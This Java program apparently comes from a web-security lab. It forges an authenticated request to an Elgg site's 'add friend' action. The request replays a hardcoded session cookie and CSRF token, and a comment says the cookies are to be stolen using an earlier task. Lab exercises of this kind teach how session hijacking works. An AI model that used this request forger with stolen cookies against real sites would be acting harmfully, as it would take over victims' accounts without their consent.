import java.io.*;
import java.net.*;

public class HTTPSimpleForge {
    public static void main(String[] args) throws IOException {
        try {
            int responseCode;
            InputStream responseIn = null;
            String requestDetails = "&__elgg_ts=1729377649&__elgg_token=87250f70319da7a9261e0d6d75ef6c9b";
            // URL to be forged.
            URL url = new URL(
                    "http://www.xsslabelgg.com/action/friends/add?friend=41" + requestDetails);
            // URLConnection instance is created to further parameterize a
            // resource request past what the state members of URL instance
            // can represent.
            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
            if (urlConn instanceof HttpURLConnection) {
                urlConn.setConnectTimeout(60000);
                urlConn.setReadTimeout(90000);
            }
            // addRequestProperty method is used to add HTTP Header Information.
            // Here we add User-Agent HTTP header to the forged HTTP packet.
            // Add other necessary HTTP Headers yourself. Cookies should be stolen
            // using the method in task3.
            urlConn.addRequestProperty("Host", "xsslabelgg.com");
            urlConn.addRequestProperty("User-agent", "Sun JDK 1.6");
            urlConn.setRequestMethod("GET");
            urlConn.addRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            urlConn.addRequestProperty("Accept-Language", "en-US,en;q=0.5");
            urlConn.addRequestProperty("Referer", "http://xsslabelgg.com/profile/charlie");
            String cookies = "Elgg=ns972v2ochma3sc4ka3o2tcu96";
            urlConn.addRequestProperty("Cookie", cookies);
            urlConn.addRequestProperty("Connection", "keep-alive");
            urlConn.addRequestProperty("Upgrade-Insecure-Requests", "1");


            // HttpURLConnection a subclass of URLConnection is returned by
            // url.openConnection() since the url is an http request.
            if (urlConn instanceof HttpURLConnection) {
                HttpURLConnection httpConn = (HttpURLConnection) urlConn;
                // Contacts the web server and gets the status code from
                // HTTP Response message.
                responseCode = httpConn.getResponseCode();
                System.out.println("Response Code = " + responseCode);
                // HTTP status code HTTP_OK means the response was
                // received sucessfully.
                if (responseCode == HttpURLConnection.HTTP_OK)
                    // Get the input stream from url connection object.
                    responseIn = urlConn.getInputStream();
                // Create an instance for BufferedReader
                // to read the response line by line.
                BufferedReader buf_inp = new BufferedReader(new InputStreamReader(responseIn));
                String inputLine;
                while ((inputLine = buf_inp.readLine()) != null) {
                    System.out.println(inputLine);
                }
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }
}
